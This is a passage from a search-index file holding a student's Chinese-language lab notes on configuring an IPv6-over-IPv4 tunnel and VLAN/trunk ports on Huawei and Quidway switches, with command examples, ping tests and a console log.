\u4e0d\u5bf9\u554a\uff1f\u4e3a\u4ec0\u4e48\u8fd8\u662f\u63d0\u793a\u8981\u5728 system-view \u4e0b\u542f\u7528IPv6\uff1f Tip \u9700\u8981\u5728 system-view \u4e2d\u6267\u884c ipv6 \u6765\u542f\u7528IPv6\uff0c\u5426\u5219\u76f8\u5173\u529f\u80fd\u90fd\u4e0d\u4f1a\u542f\u7528\u3002 \u5728\u6ca1\u6709\u542f\u52a8\u524d\uff0c\u4f60\u5728\u8bbe\u7f6eIPv6\u76f8\u5173\u7684\u5185\u5bb9\u65f6\u90fd\u4f1a\u51fa\u73b0\u4e00\u5219\u63d0\u793a\uff08INFO\uff09\u3002 \u53ef\u4ee5\u5f00\u59cb\u6765\u6298\u817e\u96a7\u9053\u4e86\uff1a 1 2 3 4 5 6 [ Huawei - LoopBack1 ] interface tunnel 0 / 0 / 0 [ Huawei - Tunnel0 / 0 / 0 ] ipv6 enable [ Huawei - Tunnel0 / 0 / 0 ] ipv6 address 2001 : 13 :: 1 64 [ Huawei - Tunnel0 / 0 / 0 ] tunnel - protocol ipv6 - ipv4 [ Huawei - Tunnel0 / 0 / 0 ] source LoopBack 0 [ Huawei - Tunnel0 / 0 / 0 ] destination 3 . 3 . 3 . 3 \u522b\u5fd8\u4e86\u8f6c\u53d1\uff1a 1 [ Huawei ] ipv6 route - static 2001 : 3 :: 64 Tunnel 0 / 0 / 0 \u540c\u6837\u7684\u9053\u7406\u5bf9AR3\u8fdb\u884c\u8bbe\u7f6e\u5c31\u53ef\u4ee5\u4e86\u3002\u5728\u4f60\u8bbe\u7f6e\u597d\u7684\u65f6\u5019\u5e94\u8be5\u5c31\u4f1a\u5728\u63a7\u5236\u53f0\u4e0a\u770b\u5230\u7aef\u53e3\u548c\u534f\u8bae UP \u7684\u4fe1\u606f\u3002 \u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\uff1a 1 display ipv6 interface Tunnel 0 / 0 / 0 \u6765\u67e5\u770b\u5b83\u4eec\u662f\u5426\u90fd\u5df2\u7ecf\u662f UP \u72b6\u6001\u3002\u8fd9\u4e2a\u65f6\u5019\u5de5\u4f5c\u5e94\u8be5\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e86\u3002","title":"\u5f00\u59cb"},{"location":"szu_courses/cn/tunnel_lab/#_5","text":"\u4f60\u5df2\u7ecf\u53ef\u4ee5\u901a\u8fc7 ping ipv6 \u6765\u6d4b\u8bd5\u7f51\u7edc\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u4e86\u3002","title":"\u6d4b\u8bd5"},{"location":"szu_courses/cn/tunnel_lab/#_6","text":"\u5b9e\u9a8c\u62a5\u544a IPv6\u96a7\u9053\u5b9e\u9a8c \u8ba1\u7b97\u673a\u7f51\u7edc","title":"\u5173\u952e\u8bcd"},{"location":"szu_courses/cn/vlan_lab/","text":"\u8ba9\u961f\u53cb\u548c\u6211\u4e00\u8d77\u6298\u817e\u5230\u4e86\u516d\u70b9\u591a\uff0c\u6709\u70b9\u6127\u759a\uff0c\u611f\u8c22\u5404\u4f4d\u5927\u4f6c\u652f\u6301\u3002 \u8bb0\u5f55\u4e00\u4e0b\u8e29\u5751\u7684\u5386\u53f2\uff0c\u5e0c\u671b\u5bf9\u5404\u4f4d\u6709\u6240\u5e2e\u52a9\uff0c\u5982\u679c\u6587\u4e2d\u5b58\u5728\u5dee\u9519\uff0c\u8fd8\u671b\u5404\u4f4d\u6307\u70b9\u3002 \u8fd9\u6b21\u7684\u73af\u5883\u662f\uff1a \u673a\u623f\u7684\u7535\u81114\u53f0\uff0c\u5168\u90e8\u662fWindows 7\u7cfb\u7edf\u3002\u5176\u4e2d\u4e00\u53f0\u7535\u8111\u4f7f\u7528Xshell\uff0c\u901a\u8fc7\u4e32\u53e3\u8fde\u63a5\u5e76\u914d\u7f6e\u4ea4\u6362\u673a\u3002 Quidway S5700\u7cfb\u5217\u4ea4\u6362\u673a1\u53f0\uff0cQuidway S3700\u7cfb\u5217\u4ea4\u6362\u673a1\u53f0\u3002 ...\u5e76\u4e0d\u662f\u6211\u6545\u610f\u627e\u4e86\u4e24\u53f0\u4e0d\u4e00\u6837\u7684\uff0c\u800c\u662f\u6211\u6240\u5728\u7684\u4f4d\u7f6e\u4e0a\u7684\u67dc\u5b50\u91cc\u5c31\u662f\u8fd9\u6837\u7684\u3002\u8fd9\u6837\u7684\u60c5\u51b5\u5e26\u6765\u7684\u95ee\u9898\u5c31\u662f\u6709\u4e9b\u547d\u4ee4\u4e0d\u5927\u4e00\u6837\uff0c\u9700\u8981\u5148\u7ffb\u624b\u518c\u624d\u77e5\u9053\u3002\u5f53\u7136\u4f60\u8981\u662f\u56e0\u4e3a\u8fd9\u4e2a\u5c31\u9ed1\u8bf4\u8001\u5e08\u7684PPT\u4e0d\u5bf9\u5c31\u6709\u70b9\u8fc7\u4e86\uff0cPPT\u4e0a\u9762\u7684\u5185\u5bb9\u4e2a\u4eba\u8ba4\u4e3a\u6700\u591a\u7b97\u662f\u542f\u53d1\u6027\u8d28\u7684\u3001\u5927\u65b9\u5411\u4e0a\u7684\u6559\u7a0b\uff0c\u5e76\u4e14\u9488\u5bf9\u7684\u4ea4\u6362\u673a\u578b\u53f7\u3001\u786c\u4ef6\u7248\u672c\u3001\u56fa\u4ef6\u7248\u672c\u4e0d\u80fd\u603b\u662f\u548c\u4f60\u6240\u5728\u7684\u73af\u5883\u4e00\u6837\uff0c\u66f4\u591a\u7684\u7ec6\u8282\u4e0a\u7684\u95ee\u9898\u4f60\u603b\u662f\u9700\u8981\u81ea\u5df1\u60f3\u529e\u6cd5\u53bb\u89e3\u51b3\u548c\u9002\u5e94\u3002 CONSOLE\u767b\u5f55 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u4ea4\u6362\u673a\u4e0a\u9762\u7684CONSOLE\u53e3\u6709\u4e00\u6839\u7ebf\u8fde\u5230\u4e86\u67d0\u53f0\u7535\u8111\u7684RS-232\uff08\u8fd9\u4e2a\u662f\u6211\u778e\u8bf4\u7684\uff09\u53e3\u4e0a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u7528\u8fd9\u53f0\u7535\u8111\u6765\u914d\u7f6e\u4ea4\u6362\u673a\u5427\u3002 PPT\u91cc\u7684\u793a\u4f8b\u4f7f\u7528\u7684\u662f\u8d85\u7ea7\u7ec8\u7aef\uff0c\u4e0d\u8fc7\u6211\u4f7f\u7528\u7684\u662fXshell\uff0c\u50cf\u8fd9\u6837\u5b50\u65b0\u5efa\u4e00\u4e2a\u8fde\u63a5\uff0c\u7136\u540e\u9009\u62e9 \u4e32\u53e3SERIAL \uff1a \u5148\u522b\u6025\u7740\u786e\u5b9a\uff0c\u6211\u4e00\u822c\u4f1a\u4e60\u60ef\u6027\u5730\u5148\u770b\u770b\u7aef\u53e3\u53f7\uff1a \u662f COM1 \u6ca1\u9519\u4e86\uff0c\u8bb0\u4f4f\u5b83\uff0c\u5230\u5de6\u4fa7\u7684 SERIAL \u4e2d\u786e\u8ba4\u4e00\u4e0b\u5404\u9879\u53c2\u6570\u662f\u5426\u6b63\u786e\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8fde\u63a5\u4e86\u3002 \u8fde\u63a5\u4e0a\u4e4b\u540e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f93\u5165\u4e00\u4e2a\u95ee\u53f7 ? \u6765\u67e5\u770b\u5e2e\u52a9\uff0c\u5e73\u65f6\u8f93\u5165\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528 TAB \u6765\u63d0\u793a\u76f8\u5173\u8bcd\u3002 \u7136\u540e\u6839\u636e\u5b9e\u9a8c\u62a5\u544a\u7684\u8981\u6c42\uff0c\u4f60\u53ef\u4ee5\u5230\u5404\u79cd\u89c6\u56fe\u4e2d\u8f6c\u60a0\u8f6c\u60a0\u719f\u6089\u4e00\u4e0b\u64cd\u4f5c\uff1a \u4ec0\u4e48\uff1f\u4f60\u8bf4PPT\u4e0a\u7684\u7aef\u53e3\u4e0d\u5bf9\uff1f\u4f60\u770b\u8fc7\u6587\u6863\u6216\u662f display \u770b\u8fc7\u4e86\u5417\uff1f \u8fd9\u91cc\u5c31\u4e0d\u518d\u591a\u8bf4\u4ec0\u4e48\u4e86\uff0c\u7aef\u53e3\u5404\u79cd\u914d\u7f6e\u5404\u4f4d\u5c31\u81ea\u884c\u770b\u6587\u6863\u53d1\u6398\u5427\u3002 VLAN\u57fa\u672c\u914d\u7f6e \u9898\u76ee\u8981\u6c42\u5927\u6982\u662f\u8fd9\u6837\u7684\uff1a \u6309\u56fe\u8fde\u63a5\u597d\u5b9e\u9a8c\u8bbe\u5907\uff0cPC1\u3001PC2\u3001\u4ea4\u6362\u673a\u7684IP\u5730\u5740\u5206\u522b\u4e3a10.110.10.1\u300110.110.10.2\u300110.110.10.3\uff0c\u5b50\u7f51\u63a9\u7801\u5747\u8bbe\u7f6e\u4e3a255.255.255.0\u3002\u5efa\u7acbVLAN2\u3001VLAN3\uff0c\u901a\u8fc7\u914d\u7f6e\u5c06\u7aef\u53e3Ethernet 0/3\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u5c06\u7aef\u53e3Ethernet 0/4\u5305\u542b\u5230VLAN3\u4e2d\uff0c\u5e76\u4f7f\u7528PING\u547d\u4ee4\u68c0\u67e5VLAN\u5de5\u4f5c\u60c5\u51b5\uff0c\u6d4b\u8bd5PC1\u3001PC2\u3001\u4ea4\u6362\u673a\u4e4b\u95f4\u80fd\u5426PING\u6210\u529f\u3002 \u5c06\u7aef\u53e3Ethernet 0/4\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u5e76\u4f7f\u7528PING\u547d\u4ee4\u68c0\u67e5VLAN\u5de5\u4f5c\u60c5\u51b5\uff0c\u6d4b\u8bd5PC1\u3001PC2 \u3001\u4ea4\u6362\u673a\u4e4b\u95f4\u80fd\u5426PING\u6210\u529f\u3002 \u6240\u4ee5\u6211\u4eec\u5148\u628aPC1\u3001PC2\u5206\u522b\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u7684Ethernet 0/0/3\u3001Ethernet 0/0/4\u4e0a\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fde\u63a5\u6b63\u786e\u7684\u65f6\u5019\u4f60\u80fd\u770b\u5230\u4ea4\u6362\u673a\u4e0a\u5bf9\u5e94\u6570\u5b57\u7684\u706f\u5728\u95ea\u70c1\u3002\u8fde\u63a5\u5b8c\u6210\u540e\u6211\u4eec\u5728PC\u4e0a\u8bbe\u7f6e\u4e00\u4e0bIP\u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801\uff1a \u4f60\u5e94\u8be5\u80fd\u627e\u5230\u5b83\u5728\u54ea\u91cc\u5427...\u63a7\u5236\u9762\u677f->\u7f51\u7edc\u548c\u548c\u5171\u4eab\u4e2d\u5fc3->\u672c\u5730\u8fde\u63a5->\u5c5e\u6027->IPv4\u3002 \u81f3\u4e8e\u4ea4\u6362\u673a\u7684IP\u5730\u5740\u7684\u8bbe\u7f6e... \u4f60\u9700\u8981\u5728vlanif\u4e0a\u914d\u7f6e\u5b83 \uff0c\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u53c2\u9605\u8fd9\u91cc\uff1a vlanif\u548cvlan\u7684\u533a\u522b \u4ea4\u6362\u673a\u8981ip\u6709\u4ec0\u4e48\u7528\uff1f \u6000\u7591\u6587\u7ae0\u6709\u95ee\u9898\u4e4b\u524d\u6700\u597d\u5148\u786e\u8ba4\u4e00\u4e0b\u81ea\u5df1\u662f\u5426\u5df2\u7ecf\u8bfb\u4e86\u4e0a\u8ff0\u6587\u7ae0 \u63a5\u4e0b\u6765\u6211\u4eec\u8be5\u6765\u914d\u7f6e\u4e00\u4e0bVLAN\u4e86\u3002\u6839\u636e\u8981\u6c42\uff0c\u628aEthernet 0/0/3\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u628aEthernet 0/0/4\u5305\u542b\u5230VLAN3\u4e2d\uff1a \u5728VLAN\u4e2d\u6dfb\u52a0\u7aef\u53e3\u4e5f\u662f\u53ef\u884c\u7684\u3002 \u5982\u679c\u9047\u5230\u95ee\u9898\u9700\u8981\u66f4\u6539\u7aef\u53e3\u7c7b\u578b\uff1a \u5982\u679c\u4f60\u4e0d\u660e\u767d\uff0c\u6211\u60f3\u4f60\u5e94\u8be5\u53bb\u641c\u7d22\u4e00\u4e0b\u6709\u5173trunk/access/hybrid\u7684\u5185\u5bb9\u3002 \u53e6\u4e00\u4e2a\u63a5\u53e3\u540c\u7406\uff0c\u90fd\u914d\u7f6e\u597d\u4e4b\u540e\u5e94\u8be5\u80fd\u770b\u5230\u662f\u8fd9\u6837\u7684\uff1a \u8fd9\u4e2a\u65f6\u5019\u5c31\u53ef\u4ee5\u5f00\u59cb\u6d4b\u8bd5\u4e86\uff1a \u7531\u4e8e\u4e24\u4e2aPC\u88ab\u5206\u914d\u5230\u4e86\u4e0d\u540c\u7684VLAN\u4e2d\uff0c\u5e76\u4e14\u6ca1\u6709\u53ef\u8fbe\u8def\u7531\uff0c\u6240\u4ee5\u5b83\u4eec\u4e0d\u80fd\u4e92\u76f8\u901a\u4fe1\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5207\u6362\u5230Xshell\u4e2d\u66f4\u6539VLAN\u5212\u5206\u3002\u7531\u4e8e\u521a\u521a\u7684ping\u5e26\u6709-t\u53c2\u6570\uff0c\u5b83\u4f1a\u4e0d\u505c\u5730\u7ee7\u7eed\u53d1\u9001ping\u5305\u3002\u6211\u4eec\u6765\u628aEthernet 0/0/4\u6539\u5230VLAN2\u4e2d\u770b\u770b\uff1a \u6211\u4eec\u521a\u628aEthernet 0/0/4\u6dfb\u52a0\u5230VLAN2\u540e\u9a6c\u4e0a\u53ef\u4ee5\u770b\u5230\u8fd9\u8fb9\u5df2\u7ecf\u53ef\u4ee5ping\u901a\u4e86\u3002 Trunking \u5e0c\u671b\u4f60\u5728\u641e\u8fd9\u4e2a\u4e4b\u524d\u5df2\u7ecf\u6e05\u695a\u5730\u77e5\u9053\u81ea\u5df1\u5728\u505a\u4ec0\u4e48...\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u6211\u89c9\u5f97\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u7740\u53bb\u641c\u4e00\u4e0b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u4e5f\u53ef\u4ee5\u770b\u770b\u5355\u7ebf\u590d\u7528\u3001\u5355\u81c2\u8def\u7531\u4e4b\u7c7b\u7684\u5e94\u7528\uff0c\u6216\u8bb8\u80fd\u6709\u6240\u5e2e\u52a9\uff0c\u800c\u4e14\u8bf4\u4e0d\u5b9a\u5c31\u80fd\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\u7528\u8d77\u6765\u4e86\u5462\uff1f \u6211\u4eec\u5148\u628a\u4e4b\u524d\u521b\u5efa\u7684VLAN\u5148\u90fd\u5220\u6389\uff1a \u8fd9\u4e2a\u65f6\u5019\u8fd8\u662f\u63a5\u7ebf\uff0c\u6309\u7167PPT\u8bf4\u660e\u63a5\u597d\uff1a \u6309\u56fe\u8fde\u63a5\u597d\u5b9e\u9a8c\u8bbe\u5907\uff0cPC1\u3001PC2\u3001PC3\u3001PC4\u7684IP\u5730\u5740\u5206\u522b\u4e3a10.110.10.1\u300110.110.10.2\u300110.110.10.3\u300110.110.10.4\uff0c\u5b50\u7f51\u63a9\u7801\u5747\u8bbe\u7f6e\u4e3a255.255.255.0\u3002\u5efa\u7acbVLAN2\u3001VLAN3\uff0c\u901a\u8fc7\u914d\u7f6e\u5c06PC1\u548cPC3\u6240\u8fde\u7aef\u53e3\u5305\u542b\u5230VLAN3\u4e2d\uff0c\u901a\u8fc7\u914d\u7f6e\u5c06PC2\u548cPC4\u6240\u8fde\u7aef\u53e3\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u5c06\u4e24\u53f0\u4ea4\u6362\u673a\u7684Ethernet 0/23\u7aef\u53e3\u8bbe\u7f6e\u4e3aTrunk\u7aef\u53e3\uff0c\u5e76\u5141\u8bb8\u6240\u6709VLAN\u901a\u8fc7\u3002 \u7531\u4e8e\u8fd9\u4e2a\u4ea4\u6362\u673a\u768422\u597d\u50cf\u662f\u574f\u7684...\u4e8e\u662f\u6362\u5230\u4e8620\u4e0a\uff08\u771f\u662f\u5c34\u5c2c\uff09\u3002\u6240\u4ee5\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u5e72\u7684\u4e8b\u60c5\u662f\uff1a \u5c06PC1\u8fde\u63a5\u5230\u4ea4\u6362\u673a1\u7684Ethernet 0/0/3\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.1/24\uff1b \u5c06PC2\u8fde\u63a5\u5230\u4ea4\u6362\u673a1\u7684Ethernet 0/0/12\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.2/24\uff1b \u5c06PC3\u8fde\u63a5\u5230\u4ea4\u6362\u673a2\u7684Ethernet 0/0/13\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.3/24\uff1b \u5c06PC4\u8fde\u63a5\u5230\u4ea4\u6362\u673a2\u7684Ethernet 0/0/20\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.4/24\uff1b \u627e\u6839\u7f51\u7ebf\u628a\u4ea4\u6362\u673a1\u7684Ethernet 0/0/23\u548c\u4ea4\u6362\u673a2\u7684Ethernet 0/0/23\u8fde\u63a5\u8d77\u6765\u3002 \u5927\u6982\u4f1a\u662f\u8fd9\u4e2a\u6837\u5b50\uff1a \u63a5\u4e0b\u6765\u7ee7\u7eed\u56de\u5230Xshell\u4e0a\u5f00\u59cb\u914d\u7f6e\u4ea4\u6362\u673a\uff0c\u6211\u4eec\u5148\u6765\u6298\u817e\u4ea4\u6362\u673a1\uff1a \u5c06Ethernet 0/0/3\u6dfb\u52a0\u5230VLAN3\u4e2d\uff1b \u5c06Ethernet 0/0/12\u6dfb\u52a0\u5230VLAN2\u4e2d\uff1b \u5c06Ethernet 0/0/23\u914d\u7f6e\u4e3atrunk\u5e76\u5141\u8bb8VLAN\u2154\u7684\u6d41\u91cf\u901a\u8fc7\u3002 \u8fd9\u53f0\u4ea4\u6362\u673a\u7684\u7aef\u53e3\u5c31\u4e0d\u50cf\u60f3\u8c61\u4e2d\u7684\u90a3\u6837\u4e86\uff1a \u597d\u5427...\u539f\u6765\u662f GigabitEthernet0/0/1 \uff0c\u539f\u8c05\u6211\u8fd9\u79cd\u53ea\u4f1a\u7528\u7f51\u4ef6\u90a3\u79cd\u6709\u914d\u7f6e\u7a0b\u5e8f\u7684\u4ea4\u6362\u673a\u7684\u4ebaTAB\u4e86\u534a\u5929... \u8fd9\u91cc\u6dfb\u52a0\u5404\u7aef\u53e3\u5230VLAN\u4e2d\u7684\u547d\u4ee4\u5927\u5bb6\u5e94\u8be5\u90fd\u6e05\u695a\u4e86\uff0c\u4e0d\u518d\u6302\u56fe\u4e86...\u770b\u770btrunk\uff1a \u522b\u5fd8\u4e86\u8fd8\u8981\u5141\u8bb8\u6d41\u91cf\u901a\u8fc7\uff1a \u662f\u4e0d\u662f\u53c8\u60f3\u8bf4\u548cPPT\u91cc\u4e0d\u4e00\u6837\uff1f\u53ef\u662f\u5b98\u65b9\u6587\u6863\u91cc\u53ef\u662f\u6e05\u6e05\u695a\u695a\u5730\u53ea\u6709\u4e0a\u9762\u56fe\u91cc\u90a3\u79cd\u7528\u6cd5\u7684\u54e6\u3002\u81ea\u5df1\u52a8\u624b\uff0c\u4e30\u8863\u8db3\u98df\u5427\u3002 \u68c0\u67e5\u8fc7\u6ca1\u6709\u95ee\u9898\u4e86\u5c31\u53ef\u4ee5\u7ee7\u7eed\u914d\u7f6e\u4ea4\u6362\u673a2\u4e86\uff1a \u5c06Ethernet0/0/13\u6dfb\u52a0\u5230VLAN3\u4e2d\uff1b \u5c06Ethernet0/0/20\u6dfb\u52a0\u5230VLAN2\u4e2d\uff1b \u5c06Ethernet0/0/23\u914d\u7f6e\u4e3atrunk\u5e76\u5141\u8bb8VLAN\u2154\u7684\u6d41\u91cf\u901a\u8fc7\u3002 \u8ddf\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u6211\u5c31\u4e0d\u7d2f\u6b7b\u7d2f\u6d3b\u4e0a\u56fe\u4e86\u3002\u5982\u679c\u4e24\u53f0\u90fd\u914d\u7f6e\u597d\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e86\uff01\u6839\u636e\u5b9e\u9a8c\u8981\u6c42\uff1a PC1\u548cPC2\u4e4b\u95f4\u80fd\u5426ping\u6210\u529f\uff1a \u7531\u4e8ePC1\u548cPC2\u4e0d\u5728\u540c\u4e00\u4e2aVLAN\uff0c\u5e76\u4e14\u4e0d\u5b58\u5728\u53ef\u8fbe\u8def\u7531\uff0c\u6240\u4ee5\u4e0d\u80fdping\u901a\u3002 PC1\u548cPC3\u4e4b\u95f4\u80fd\u5426ping\u6210\u529f\uff1a PC1\u548cPC3\u5728\u540c\u4e00\u4e2aVLAN\u4e2d\uff0c\u5e76\u4e14\u914d\u7f6e\u597d\u4e86trunk\uff0c\u53ef\u4ee5ping\u901a\u3002 PC2\u548cPC4\u4e4b\u95f4\u80fd\u5426ping\u6210\u529f\uff1a \u540c\u4e00VLAN\uff0c\u5e76\u4e14\u6709\u6b63\u786e\u7684trunk\uff0c\u53ef\u4ee5ping\u901a\u3002 \u9644\u52a0\u4e00\u4e2aPC2\u548cPC3\uff1a \u5927\u6982\u8fd9\u6837\u5b50\u5c31\u5706\u6ee1\u5b8c\u6210\u4e86\u3002\u4e0d\u8fc7\u8d70\u4e4b\u524d\u522b\u5fd8\u4e86\u5220\u6389VLAN\uff0c\u7f51\u7ebf\u63d2\u56de\u539f\u4f4d\u4e4b\u7c7b\u7684\u626b\u5c3e\u5de5\u4f5c\u54c8\u3002 \u63a7\u5236\u53f0\u8bb0\u5f55 \u4e00\u4e9b\u63a7\u5236\u53f0\u8bb0\u5f55\uff0c\u4ec5\u4f9b\u53c2\u8003\uff0c\u5e76\u4e14\u6709\u6211\u778e\u73a9\u7684\u8bb0\u5f55\u3002\u8bf7\u52a1\u5fc5\u8bb0\u5f97\u770b\u6587\u6863\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <Quidway>system-view [ Quidway ] interface Vlanif 2 Error: The VLAN does not exist. [ Quidway ] vlan 2 [ Quidway-vlan2 ] quit [ Quidway ] interface Vlanif 2 [ Quidway-Vlanif2 ] ip address 10 .110.10.3 255 .255.255.0 [ Quidway ] undo vlan 2 Error: The VLAN has a L3 interface. Please delete it first. [ Quidway ] vlan 2 [ Quidway-vlan2 ] port Ethernet0/0/3 Error: Trunk or Hybrid port ( s ) cannot be added or deleted in this manner. [ Quidway ] interface Ethernet0/0/3 [ Quidway-Ethernet0/0/3 ] port link-type access [ Quidway-Ethernet0/0/3 ] port default vlan 2 [ Quidway-Ethernet0/0/3 ] display vlan 2 * : management-vlan --------------------- VLAN ID Type Status MAC Learning Broadcast/Multicast/Unicast Property -------------------------------------------------------------------------------- 2 common enable enable forward forward forward default ---------------- Untagged Port: Ethernet0/0/3 ---------------- Interface Physical Ethernet0/0/3 UP 1 2 3 [ Quidway ] interface GigabitEthernet0/0/23 [ Quidway-GigabitEthernet0/0/23 ] port link-type trunk [ Quidway-GigabitEthernet0/0/23 ] port trunk allow-pass vlan all \u5173\u952e\u8bcd \u5b9e\u9a8c\u62a5\u544a \u4ea4\u6362\u673a\u4e0e\u865a\u62df\u5c40\u57df\u7f51 \u8ba1\u7b97\u673a\u7f51\u7edc","title":"VLAN Lab"},{"location":"szu_courses/cn/vlan_lab/#console","text":"\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u4ea4\u6362\u673a\u4e0a\u9762\u7684CONSOLE\u53e3\u6709\u4e00\u6839\u7ebf\u8fde\u5230\u4e86\u67d0\u53f0\u7535\u8111\u7684RS-232\uff08\u8fd9\u4e2a\u662f\u6211\u778e\u8bf4\u7684\uff09\u53e3\u4e0a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u7528\u8fd9\u53f0\u7535\u8111\u6765\u914d\u7f6e\u4ea4\u6362\u673a\u5427\u3002 PPT\u91cc\u7684\u793a\u4f8b\u4f7f\u7528\u7684\u662f\u8d85\u7ea7\u7ec8\u7aef\uff0c\u4e0d\u8fc7\u6211\u4f7f\u7528\u7684\u662fXshell\uff0c\u50cf\u8fd9\u6837\u5b50\u65b0\u5efa\u4e00\u4e2a\u8fde\u63a5\uff0c\u7136\u540e\u9009\u62e9 \u4e32\u53e3SERIAL \uff1a \u5148\u522b\u6025\u7740\u786e\u5b9a\uff0c\u6211\u4e00\u822c\u4f1a\u4e60\u60ef\u6027\u5730\u5148\u770b\u770b\u7aef\u53e3\u53f7\uff1a \u662f COM1 \u6ca1\u9519\u4e86\uff0c\u8bb0\u4f4f\u5b83\uff0c\u5230\u5de6\u4fa7\u7684 SERIAL \u4e2d\u786e\u8ba4\u4e00\u4e0b\u5404\u9879\u53c2\u6570\u662f\u5426\u6b63\u786e\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u8fde\u63a5\u4e86\u3002 \u8fde\u63a5\u4e0a\u4e4b\u540e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f93\u5165\u4e00\u4e2a\u95ee\u53f7 ? \u6765\u67e5\u770b\u5e2e\u52a9\uff0c\u5e73\u65f6\u8f93\u5165\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528 TAB \u6765\u63d0\u793a\u76f8\u5173\u8bcd\u3002 \u7136\u540e\u6839\u636e\u5b9e\u9a8c\u62a5\u544a\u7684\u8981\u6c42\uff0c\u4f60\u53ef\u4ee5\u5230\u5404\u79cd\u89c6\u56fe\u4e2d\u8f6c\u60a0\u8f6c\u60a0\u719f\u6089\u4e00\u4e0b\u64cd\u4f5c\uff1a \u4ec0\u4e48\uff1f\u4f60\u8bf4PPT\u4e0a\u7684\u7aef\u53e3\u4e0d\u5bf9\uff1f\u4f60\u770b\u8fc7\u6587\u6863\u6216\u662f display \u770b\u8fc7\u4e86\u5417\uff1f \u8fd9\u91cc\u5c31\u4e0d\u518d\u591a\u8bf4\u4ec0\u4e48\u4e86\uff0c\u7aef\u53e3\u5404\u79cd\u914d\u7f6e\u5404\u4f4d\u5c31\u81ea\u884c\u770b\u6587\u6863\u53d1\u6398\u5427\u3002","title":"CONSOLE\u767b\u5f55"},{"location":"szu_courses/cn/vlan_lab/#vlan","text":"\u9898\u76ee\u8981\u6c42\u5927\u6982\u662f\u8fd9\u6837\u7684\uff1a \u6309\u56fe\u8fde\u63a5\u597d\u5b9e\u9a8c\u8bbe\u5907\uff0cPC1\u3001PC2\u3001\u4ea4\u6362\u673a\u7684IP\u5730\u5740\u5206\u522b\u4e3a10.110.10.1\u300110.110.10.2\u300110.110.10.3\uff0c\u5b50\u7f51\u63a9\u7801\u5747\u8bbe\u7f6e\u4e3a255.255.255.0\u3002\u5efa\u7acbVLAN2\u3001VLAN3\uff0c\u901a\u8fc7\u914d\u7f6e\u5c06\u7aef\u53e3Ethernet 0/3\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u5c06\u7aef\u53e3Ethernet 0/4\u5305\u542b\u5230VLAN3\u4e2d\uff0c\u5e76\u4f7f\u7528PING\u547d\u4ee4\u68c0\u67e5VLAN\u5de5\u4f5c\u60c5\u51b5\uff0c\u6d4b\u8bd5PC1\u3001PC2\u3001\u4ea4\u6362\u673a\u4e4b\u95f4\u80fd\u5426PING\u6210\u529f\u3002 \u5c06\u7aef\u53e3Ethernet 0/4\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u5e76\u4f7f\u7528PING\u547d\u4ee4\u68c0\u67e5VLAN\u5de5\u4f5c\u60c5\u51b5\uff0c\u6d4b\u8bd5PC1\u3001PC2 \u3001\u4ea4\u6362\u673a\u4e4b\u95f4\u80fd\u5426PING\u6210\u529f\u3002 \u6240\u4ee5\u6211\u4eec\u5148\u628aPC1\u3001PC2\u5206\u522b\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u7684Ethernet 0/0/3\u3001Ethernet 0/0/4\u4e0a\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fde\u63a5\u6b63\u786e\u7684\u65f6\u5019\u4f60\u80fd\u770b\u5230\u4ea4\u6362\u673a\u4e0a\u5bf9\u5e94\u6570\u5b57\u7684\u706f\u5728\u95ea\u70c1\u3002\u8fde\u63a5\u5b8c\u6210\u540e\u6211\u4eec\u5728PC\u4e0a\u8bbe\u7f6e\u4e00\u4e0bIP\u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801\uff1a \u4f60\u5e94\u8be5\u80fd\u627e\u5230\u5b83\u5728\u54ea\u91cc\u5427...\u63a7\u5236\u9762\u677f->\u7f51\u7edc\u548c\u548c\u5171\u4eab\u4e2d\u5fc3->\u672c\u5730\u8fde\u63a5->\u5c5e\u6027->IPv4\u3002 \u81f3\u4e8e\u4ea4\u6362\u673a\u7684IP\u5730\u5740\u7684\u8bbe\u7f6e... 